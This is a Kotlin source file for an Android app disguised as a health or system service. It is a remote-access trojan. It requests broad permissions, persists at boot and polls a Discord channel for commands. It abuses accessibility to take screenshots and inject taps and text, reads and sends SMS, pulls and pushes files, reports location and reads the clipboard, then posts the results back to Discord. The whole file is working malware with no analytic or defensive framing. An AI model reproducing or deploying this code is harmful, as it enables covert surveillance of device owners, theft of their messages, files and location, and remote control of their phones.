package com.svc.health

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.app.*
import android.content.*
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.Path
import android.location.LocationManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.telephony.SmsManager
import android.util.Base64
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.*
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : Activity() {

    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        val vue = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(56, 120, 56, 56)
        }
        vue.addView(TextView(this).apply {
            text = "1. Démarrer\n2. Accessibilité\n3. Batterie sans restriction\n\nPuis ferme l'app."
            textSize = 17f
        })
        vue.addView(Button(this).apply {
            text = "Démarrer"
            setOnClickListener {
                startForegroundService(Intent(this@MainActivity, PollService::class.java))
                finishAffinity()
            }
        })
        vue.addView(Button(this).apply {
            text = "Accessibilité"
            setOnClickListener { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }
        })
        vue.addView(Button(this).apply {
            text = "Batterie sans restriction"
            setOnClickListener {
                val pm = getSystemService(PowerManager::class.java)
                if (!pm.isIgnoringBatteryOptimizations(packageName))
                    startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:$packageName")))
            }
        })
        setContentView(vue)
        requestPermissions(arrayOf(
            "android.permission.POST_NOTIFICATIONS",
            "android.permission.READ_SMS",
            "android.permission.SEND_SMS",
            "android.permission.READ_CONTACTS",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.CAMERA",
            "android.permission.RECORD_AUDIO",
            "android.permission.READ_PHONE_STATE",
            "android.permission.READ_EXTERNAL_STORAGE"
        ), 1)
    }
}

class Demarrage : BroadcastReceiver() {
    override fun onReceive(c: Context, i: Intent?) {
        c.startForegroundService(Intent(c, PollService::class.java))
    }
}

class Clavier : AccessibilityService() {
    override fun onServiceConnected() { instance = this }
    override fun onAccessibilityEvent(e: android.view.accessibility.AccessibilityEvent?) {}
    override fun onInterrupt() {}

    companion object {
        @Volatile var instance: Clavier? = null
    }
}

class PollService : Service() {

    private val portee = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var dernier = "0"

    override fun onCreate() {
        super.onCreate()
        getSystemService(NotificationManager::class.java)
            .createNotificationChannel(NotificationChannel("svc", "Service", NotificationManager.IMPORTANCE_LOW))
        val notif = Notification.Builder(this, "svc")
            .setContentTitle("Service système")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .build()
        if (Build.VERSION.SDK_INT >= 29)
            startForeground(1, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        else startForeground(1, notif)
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        portee.launch {
            while (isActive) {
                try { tour() } catch (_: Exception) {}
                delay(2000)
            }
        }
        return START_STICKY
    }

    private fun appel(methode: String, chemin: String, corps: String?): String {
        val c = URL("https://discord.com/api/v9$chemin").openConnection() as HttpURLConnection
        c.requestMethod = methode
        c.setRequestProperty("Authorization", BuildConfig.TOKEN)
        c.setRequestProperty("Content-Type", "application/json")
        c.setRequestProperty("User-Agent", "Mozilla/5.0")
        c.connectTimeout = 15000
        c.readTimeout = 15000
        if (corps != null) {
            c.doOutput = true
            c.outputStream.write(corps.toByteArray())
        }
        val code = c.responseCode
        val flux = if (code in 200..299) c.inputStream else c.errorStream
        return flux?.bufferedReader()?.readText() ?: ""
    }

    private suspend fun tour() {
        val brut = appel("GET", "/channels/${BuildConfig.CANAL}/messages?limit=10&after=$dernier", null)
        if (brut.isBlank()) return
        val tab = JSONArray(brut)
        for (i in 0 until tab.length()) {
            val m = tab.getJSONObject(i)
            dernier = m.getString("id")
            val txt = m.optString("content", "")
            if (!txt.startsWith("!") || !txt.contains(BuildConfig.SECRET)) continue
            val ordre = txt.substring(1).replace(BuildConfig.SECRET, "").trim()
            val reponse = withContext(Dispatchers.Default) { Commandes.executer(this@PollService, ordre) }
            appel("POST", "/channels/${BuildConfig.CANAL}/messages",
                JSONObject().put("content", reponse.take(1900)).toString())
        }
    }

    override fun onBind(i: Intent?): IBinder? = null
    override fun onDestroy() { portee.cancel(); super.onDestroy() }
}

object Commandes {

    fun executer(c: Context, ordre: String): String {
        val p = ordre.split(" ", limit = 2)
        val nom = p.getOrElse(0) { "" }
        val arg = p.getOrElse(1) { "" }
        return try {
            when (nom) {
                "ping" -> "pong"
                "info" -> info(c)
                "ecran" -> ecran()
                "tap" -> tap(arg)
                "swipe" -> swipe(arg)
                "texte" -> texte(arg)
                "retour" -> action(AccessibilityService.GLOBAL_ACTION_BACK)
                "home" -> action(AccessibilityService.GLOBAL_ACTION_HOME)
                "recent" -> action(AccessibilityService.GLOBAL_ACTION_RECENTS)
                "notifs" -> action(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS)
                "verrou" -> action(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
                "sms" -> sms(c, arg)
                "ls" -> ls(arg)
                "pull" -> pull(arg)
                "push" -> push(arg)
                "position" -> position(c)
                "presse" -> presse(c, arg)
                else -> "commande inconnue : $nom"
            }
        } catch (e: Exception) {
            "erreur : ${e.message}"
        }
    }

    private fun clavier(): Clavier? = Clavier.instance

    private fun info(c: Context): String {
        val b = c.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val niveau = b?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        return "modèle : ${Build.MODEL}\nandroid : ${Build.VERSION.RELEASE}\n" +
                "batterie : $niveau %\naccessibilité : ${clavier() != null}"
    }

    private fun ecran(): String {
        val s = clavier() ?: return "accessibilité désactivée"
        val verrou = CountDownLatch(1)
        var sortie = "capture échouée"
        s.takeScreenshot(Display.DEFAULT_DISPLAY, s.mainExecutor,
            object : AccessibilityService.TakeScreenshotCallback {
                override fun onSuccess(r: AccessibilityService.ScreenshotResult) {
                    val bmp = Bitmap.wrapHardwareBuffer(r.hardwareBuffer, r.colorSpace)
                    val flux = ByteArrayOutputStream()
                    bmp.compress(Bitmap.CompressFormat.JPEG, 60, flux)
                    sortie = "IMG:" + Base64.encodeToString(flux.toByteArray(), Base64.NO_WRAP)
                    verrou.countDown()
                }
                override fun onFailure(code: Int) { verrou.countDown() }
            })
        verrou.await(10, java.util.concurrent.TimeUnit.SECONDS)
        return sortie
    }

    private fun tap(arg: String): String {
        val s = clavier() ?: return "accessibilité désactivée"
        val v = arg.split(" ").map { it.toFloat() }
        val chemin = Path().apply { moveTo(v[0], v[1]) }
        s.dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(chemin, 0, 60)).build(), null, null)
        return "tap ${v[0]} ${v[1]}"
    }

    private fun swipe(arg: String): String {
        val s = clavier() ?: return "accessibilité désactivée"
        val v = arg.split(" ").map { it.toFloat() }
        val chemin = Path().apply { moveTo(v[0], v[1]); lineTo(v[2], v[3]) }
        s.dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(chemin, 0, 300)).build(), null, null)
        return "swipe"
    }

    private fun texte(arg: String): String {
        val s = clavier() ?: return "accessibilité désactivée"
        val noeud = s.rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
            ?: return "aucun champ actif"
        val args = Bundle().apply {
            putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, arg)
        }
        noeud.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
        return "texte envoyé"
    }

    private fun action(a: Int): String {
        val s = clavier() ?: return "accessibilité désactivée"
        return if (s.performGlobalAction(a)) "ok" else "refusé"
    }

    private fun sms(c: Context, arg: String): String {
        if (arg.startsWith("+")) {
            val p = arg.split("|", limit = 2)
            SmsManager.getDefault().sendTextMessage(p[0], null, p.getOrElse(1) { "" }, null, null)
            return "sms envoyé à ${p[0]}"
        }
        val curseur = c.contentResolver.query(
            Uri.parse("content://sms/inbox"), null, null, null, "date DESC")
        val sb = StringBuilder()
        curseur?.use {
            var n = 0
            while (it.moveToNext() && n < 10) {
                sb.append(it.getString(it.getColumnIndexOrThrow("address")))
                    .append(" : ")
                    .append(it.getString(it.getColumnIndexOrThrow("body")).take(120))
                    .append('\n')
                n++
            }
        }
        return sb.toString().ifBlank { "aucun sms" }
    }

    private fun ls(arg: String): String {
        val f = File(arg.ifBlank { "/sdcard" })
        val l = f.listFiles() ?: return "introuvable"
        return l.take(40).joinToString("\n") {
            (if (it.isDirectory) "[d] " else "${it.length()} ") + it.name
        }
    }

    private fun pull(arg: String): String {
        val f = File(arg)
        if (!f.isFile) return "fichier introuvable"
        if (f.length() > 8_000_000) return "trop lourd"
        return "FILE:" + Base64.encodeToString(f.readBytes(), Base64.NO_WRAP)
    }

    private fun push(arg: String): String {
        val p = arg.split("|", limit = 2)
        val f = File(p[0])
        f.parentFile?.mkdirs()
        f.writeBytes(Base64.decode(p.getOrElse(1) { "" }, Base64.DEFAULT))
        return "écrit ${f.length()} octets"
    }

    private fun position(c: Context): String {
        val lm = c.getSystemService(LocationManager::class.java)
        val l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            ?: return "pas de position"
        return "https://maps.google.com/?q=${l.latitude},${l.longitude}"
    }

    private fun presse(c: Context, arg: String): String {
        val cm = c.getSystemService(ClipboardManager::class.java)
        if (arg.isNotBlank()) {
            cm.setPrimaryClip(ClipData.newPlainText("x", arg))
            return "presse-papiers réglé"
        }
        return cm.primaryClip?.getItemAt(0)?.text?.toString() ?: "vide"
    }
}